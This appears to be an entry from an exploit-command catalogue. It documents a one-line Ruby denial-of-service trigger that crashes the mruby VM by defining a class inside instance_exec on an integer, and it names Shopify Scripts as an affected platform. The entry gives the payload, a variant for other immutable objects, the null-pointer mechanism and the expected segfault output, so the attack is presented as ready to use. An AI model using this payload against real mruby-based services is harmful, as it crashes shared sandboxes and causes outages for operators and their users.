---
id: cmd-mruby-instanceexec
data: |
  |
    1.instance_exec { class X; end }
tags:
  - dos
  - exploit
  - mruby
type: command
output: Segfault or crash of the mruby VM due to null pointer dereference
executor: ruby
platforms:
  - mruby
  - Shopify Scripts
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.362Z'
verified: false
validated: true
submitted: true
---
# mruby-instance-exec-class-definition

## Command

```ruby
1.instance_exec { class X; end }
```

## Description

This Ruby command executes a block in the context of the Fixnum object 1 using instance_exec, defining a class X inside the block. It exploits the mruby vulnerability by triggering a singleton class creation failure, setting target_class to NULL, and causing a null pointer dereference during the class definition opcode, resulting in a VM crash for DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| instance | The object on which to call instance_exec (e.g., 1 for Fixnum) | Yes |
| block | The Ruby block containing class definition (e.g., { class X; end }) | Yes |

## Examples

### Basic Usage

```ruby
1.instance_exec { class X; end }
```

### Advanced Usage

```ruby
obj = 42
obj.instance_exec { class Y < Object; end }
```

Use on other immutable objects to trigger the same failure.

## Expected Output

The command causes an immediate segfault in the mruby VM, such as:

```
Segmentation fault (core dumped)
```

or a crash log indicating null pointer dereference at the opcode level, confirming DoS.

## Related

- [[Related Procedure|procedures/Exploit-mruby-instance-exec-with-Class-Definition-for-DoS]]
